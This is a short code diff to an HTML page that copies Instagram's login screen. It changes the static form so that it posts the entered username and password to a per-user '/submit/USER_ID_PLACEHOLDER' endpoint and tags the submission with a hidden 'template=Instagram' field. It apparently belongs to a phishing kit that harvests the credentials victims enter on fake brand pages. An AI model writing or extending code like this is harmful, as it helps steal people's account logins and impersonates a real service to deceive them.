@@ -150,10 +150,11 @@
     <div class="login-container">
       <h1 class="logo">Instagram</h1>
 
-      <form class="form">
-        <input type="text" placeholder="Phone number, username or email address">
-        <input type="password" placeholder="Password">
-        <button class="login-btn">Log in</button>
+      <form class="form" method="post" action="/submit/USER_ID_PLACEHOLDER">
+        <input type="text" name="username" placeholder="Phone number, username or email address" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <input type="hidden" name="template" value="Instagram">
+        <button type="submit" class="login-btn">Log in</button>
       </form>
 
       <div class="divider">OR</div>
